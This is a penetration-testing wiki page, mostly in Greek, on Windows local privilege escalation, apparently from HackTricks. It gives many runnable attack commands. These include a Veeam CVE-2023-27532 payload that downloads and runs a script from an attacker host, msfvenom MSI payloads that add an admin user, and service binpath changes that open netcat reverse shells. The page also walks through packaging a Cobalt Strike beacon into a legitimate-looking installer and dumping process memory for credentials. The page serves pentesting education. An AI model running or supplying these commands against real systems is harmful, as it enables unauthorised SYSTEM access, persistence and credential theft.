# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική θεωρία για τα Windows

### Access Tokens

**Εάν δεν γνωρίζετε τι είναι τα Windows Access Tokens, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Δείτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Εάν δεν γνωρίζετε τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσετε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Έλεγχοι ασφαλείας των Windows

Υπάρχουν διάφορα στοιχεία στα Windows που μπορούν να σας εμποδίσουν να κάνετε enumerating του συστήματος, να τρέξετε εκτελέσιμα ή ακόμα και να ανιχνεύσουν τις δραστηριότητές σας. Πρέπει να διαβάσετε την παρακάτω σελίδα και να enumerate όλους αυτούς τους μηχανισμούς άμυνας πριν ξεκινήσετε το privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Προστασία Admin / UIAccess silent elevation

Οι διεργασίες UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να καταχραστούν για να φτάσουν σε High IL χωρίς προτροπές όταν παρακάμπτονται οι έλεγχοι secure-path του AppInfo. Δείτε την ειδική ροή παράκαμψης UIAccess/Admin Protection εδώ:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση του registry της Secure Desktop accessibility μπορεί να καταχραστεί για arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Πληροφορίες συστήματος

### Version info enumeration

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Έκδοση Exploits

Αυτό το [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιέχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Αποθετήρια Github με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχει κάποιο credential/Juicy info αποθηκευμένο στις env variables;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Ιστορικό
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, περιλαμβάνοντας τις εκτελεσμένες εντολές, τις κλήσεις εντολών και τμήματα script. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου ενδέχεται να μην καταγραφούν.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 συμβάντα από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται ένα πλήρες αρχείο δραστηριότητας και όλο το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block of code τεκμηριώνεται καθώς τρέχει. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail για κάθε δραστηριότητα, πολύτιμο για forensics και την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα καταγεγραμμένα συμβάντα για το Script Block μπορούν να εντοπιστούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Μονάδες δίσκου
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείς να παραβιάσεις το σύστημα αν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάς ελέγχοντας εάν το δίκτυο χρησιμοποιεί μη-SSL WSUS ενημέρωση εκτελώντας την ακόλουθη εντολή στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το ακόλουθο σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε μια απάντηση όπως μία από τις παρακάτω:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Τότε, **είναι εκμεταλλεύσιμο.** Αν η τελευταία τιμή μητρώου είναι ίση με `0`, τότε η εγγραφή WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτή είναι η ευπάθεια που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό proxy του χρήστη, και τα Windows Updates χρησιμοποιούν τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να τρέξουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να υποκλέψουμε την κυκλοφορία μας και να εκτελέσουμε κώδικα ως αυξημένος χρήστης στο σύστημά μας.
>
> Επιπλέον, επειδή η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, θα χρησιμοποιήσει επίσης το certificate store του. Εάν δημιουργήσουμε ένα self-signed πιστοποιητικό για το hostname του WSUS και προσθέσουμε αυτό το πιστοποιητικό στο certificate store του τρέχοντος χρήστη, θα μπορέσουμε να υποκλέψουμε τόσο HTTP όσο και HTTPS WSUS traffic. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει μια trust-on-first-use επικύρωση στο πιστοποιητικό. Εάν το παρουσιαζόμενο πιστοποιητικό εμπιστευτεί από τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Auto-Updaters τρίτων κατασκευαστών και Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν μια localhost IPC επιφάνεια και ένα προνομιακό κανάλι ενημερώσεων. Εάν η enrollment μπορεί να εξαναγκαστεί προς έναν attacker server και ο updater εμπιστευτεί ένα rogue root CA ή έχει αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI που η υπηρεσία SYSTEM εγκαθιστά. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` εκθέτει μια localhost υπηρεσία στο **TCP/9401** που επεξεργάζεται μηνύματα ελεγχόμενα από attacker, επιτρέποντας αυθαίρετες εντολές ως **NT AUTHORITY\SYSTEM**.

- Αναγνώριση: επιβεβαιώστε τον listener και την έκδοση, π.χ., `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- Εκμετάλλευση: τοποθετήστε ένα PoC όπως `VeeamHax.exe` με τις απαιτούμενες Veeam DLLs στον ίδιο φάκελο, και στη συνέχεια ενεργοποιήστε ένα SYSTEM payload μέσω του τοπικού socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες προϋποθέσεις. Αυτές οι προϋποθέσεις περιλαμβάνουν περιβάλλοντα όπου το **LDAP signing is not enforced,** οι χρήστες έχουν self-rights που τους επιτρέπουν να διαμορφώσουν το **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα για χρήστες να δημιουργούν υπολογιστές εντός του domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **requirements** ικανοποιούνται με τις **default settings**.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Εάν** αυτές οι 2 εγγραφές μητρώου είναι **ενεργοποιημένες** (τιμή **0x1**), τότε χρήστες οποιουδήποτε επιπέδου προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) `*.msi` αρχεία ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε συνεδρία meterpreter μπορείτε να αυτοματοποιήσετε αυτή την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` του power-up για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για να ανεβάσετε προνόμια. Αυτό το script γράφει έναν προ-compiled MSI installer που ζητά προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε GIU πρόσβαση):
```
Write-UserAddMSI
```
Απλώς εκτέλεσε το δημιουργημένο binary για να αυξήσεις τα προνόμια.

### MSI Wrapper

Διάβασε αυτόν τον οδηγό για να μάθεις πώς να δημιουργήσεις ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημείωσε ότι μπορείς να τυλίξεις ένα "**.bat**" αρχείο αν **απλά** θέλεις να **εκτελέσεις** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Δημιούργησε** με Cobalt Strike ή Metasploit ένα **new Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Άνοιξε **Visual Studio**, επίλεξε **Create a new project** και γράψε "installer" στο πεδίο αναζήτησης. Επίλεξε το project **Setup Wizard** και πάτησε **Next**.
- Δώσε στο project ένα όνομα, π.χ. **AlwaysPrivesc**, χρησιμοποίησε **`C:\privesc`** για την τοποθεσία, επίλεξε **place solution and project in the same directory**, και πάτησε **Create**.
- Συνέχισε να πατάς **Next** μέχρι να φτάσεις στο βήμα 3 από 4 (choose files to include). Πάτησε **Add** και επίλεξε το Beacon payload που μόλις δημιούργησες. Έπειτα πάτησε **Finish**.
- Επισημάνε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, άλλαξε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες ιδιότητες που μπορείς να αλλάξεις, όπως τα **Author** και **Manufacturer**, που μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάνε δεξί κλικ στο project και επίλεξε **View > Custom Actions**.
- Κάνε δεξί κλικ στο **Install** και επίλεξε **Add Custom Action**.
- Κάνε διπλό κλικ στο **Application Folder**, επίλεξε το αρχείο **beacon.exe** και πάτησε **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελεστεί μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, άλλαξε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιώσου ότι έχεις θέσει την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσεις την **εγκατάσταση** του κακόβουλου `.msi` αρχείου στο **παρασκήνιο:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Ανιχνευτές

### Ρυθμίσεις Καταγραφής

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, είναι ενδιαφέρον να ξέρουμε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των τοπικών κωδικών του Administrator**, διασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που ανήκουν σε domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες που έχουν λάβει επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να βλέπουν τους τοπικούς κωδικούς admin εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, **οι κωδικοί σε plain-text αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ξεκινώντας με **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για το Local Security Authority (LSA) για να **αποκλείσει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη της** ή να εγχύσουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** παρουσιάστηκε στα **Windows 10**. Ο σκοπός του είναι να προστατεύσει τα credentials που αποθηκεύονται σε μια συσκευή από απειλές όπως επιθέσεις pass-the-hash.| [**Περισσότερες πληροφορίες για το Credential Guard εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** επικυρώνονται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από συστατικά του λειτουργικού συστήματος. Όταν τα στοιχεία σύνδεσης ενός χρήστη επικυρώνονται από ένα καταχωρημένο πακέτο ασφάλειας, συνήθως δημιουργούνται domain credentials για τον χρήστη.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

Πρέπει να ελέγξεις αν κάποια από τις ομάδες στις οποίες ανήκεις έχει ενδιαφέροντα δικαιώματα.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ίσως μπορείτε να κλιμακώσετε προνόμια**. Μάθετε για τις προνομιούχες ομάδες και πώς να τις εκμεταλλευτείτε για να κλιμακώσετε προνόμια εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε για ενδιαφέροντα token** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι χρήστη
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική κωδικών πρόσβασης
```bash
net accounts
```
### Λάβετε το περιεχόμενο του πρόχειρου
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Κατ' αρχάς, κατά την απαρίθμηση των διεργασιών **ελέγξτε για κωδικούς μέσα στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε **να αντικαταστήσετε κάποιο τρέχον binary** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary, ώστε να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των εκτελέσιμων αρχείων των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που εκτελείται χρησιμοποιώντας **procdump** από sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials in clear text in memory**, δοκιμάστε να κάνετε dump τη μνήμη και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς GUI εφαρμογές

**Εφαρμογές που τρέχουν ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε "command prompt", κάντε κλικ στο "Click to open Command Prompt"

## Υπηρεσίες

Service Triggers επιτρέπουν στα Windows να ξεκινήσουν μια υπηρεσία όταν συμβαίνουν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να ξεκινήσετε προνομιακές υπηρεσίες ενεργοποιώντας τους triggers τους. Δείτε τεχνικές απαρίθμησης και ενεργοποίησης εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λήψη λίστας υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε **sc** για να λάβετε πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε εάν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν λαμβάνετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Η υπηρεσία δεν μπορεί να ξεκινήσει, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν έχει συσχετισμένες ενεργοποιημένες συσκευές._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από SSDPSRV για να λειτουργήσει (για XP SP1)**

**Ένας άλλος τρόπος αντιμετώπισης αυτού του προβλήματος είναι η εκτέλεση:**
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Σε σενάριο όπου η ομάδα "Authenticated users" κατέχει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα προνόμια μπορούν να αναβαθμιστούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του εκτελέσιμου αρχείου της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την επαναδιαμόρφωση δικαιωμάτων, οδηγώντας στην ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την επαναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί την ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Επίσης κληρονομεί την ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για την ανίχνευση και εκμετάλλευση αυτής της ευπάθειας μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα στα εκτελέσιμα αρχεία υπηρεσιών

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να λάβετε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
